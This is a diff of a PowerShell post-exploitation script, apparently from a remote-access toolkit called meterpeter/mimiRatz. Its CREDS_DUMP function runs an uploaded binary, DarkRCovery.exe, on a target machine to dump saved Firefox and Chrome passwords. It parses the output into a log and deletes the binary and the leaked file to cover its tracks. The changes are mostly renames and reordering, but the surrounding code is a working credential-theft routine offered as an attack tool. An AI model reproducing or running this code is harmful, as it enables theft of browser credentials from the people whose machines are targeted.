@@ -84,6 +84,7 @@
 # )
 
 
+$IPATH = pwd
 $Path = $null
 $mpset = $False
 $param1 = $args[0] # User Inputs [Arguments]
@@ -857,27 +858,27 @@ function CREDS_DUMP {
 
     ## Leak Firefox|Chrome creds (By 0xyg3n)
     If(Test-Path "$env:tmp\DarkRCovery.exe"){
-        $IPATH = pwd
+        echo "`n`n[ Leak credentials - By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
         cd $env:tmp;./DarkRCovery.exe
         Start-Sleep -Seconds 8 # Wait for DarkRCovery to finish ..
         If(Test-Path "$env:tmp\Leaked.txt"){
-            $storecreds = Get-Content "$env:tmp\Leaked.txt" -ErrorAction SilentlyContinue
+            $StoreCreds = Get-Content "$env:tmp\Leaked.txt" -Raw -ErrorAction SilentlyContinue
             ## Check powershell version to parse data
             $PSVersion = $PSVersionTable.PSVersion.Major
             If($PSVersion -gt '4'){
-                $parseData = $storecreds|Select -Skip 1|Select -SkipLast 2
+                $ParseData = $StoreCreds|Select -Skip 1|Select -SkipLast 2
             }else{
-                $parseData = $storecreds
+                $ParseData = $StoreCreds
             }
-            echo "`n`n[ Leak credentials - By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
-            # Remove old files
+            ## Remove logfile and the binary uploaded
             Remove-Item "$env:tmp\Leaked.txt" -Force
             Remove-Item "$env:tmp\DarkRCovery.exe" -Force
-            echo $parseData >> $LogFilePath\BrowserEnum.log
+            echo $ParseData >> $LogFilePath\BrowserEnum.log
+            cd $IPATH
         }else{
             echo "[i] Not found: `$env:tmp\Leaked.txt" >> $LogFilePath\BrowserEnum.log
+            cd $IPATH
         }
-        cd $IPATH
     }else{
         echo "`n`n[ Leak credentials - By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
         echo "{Upload: meterpeter\mimiRatz\DarkRCovery.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
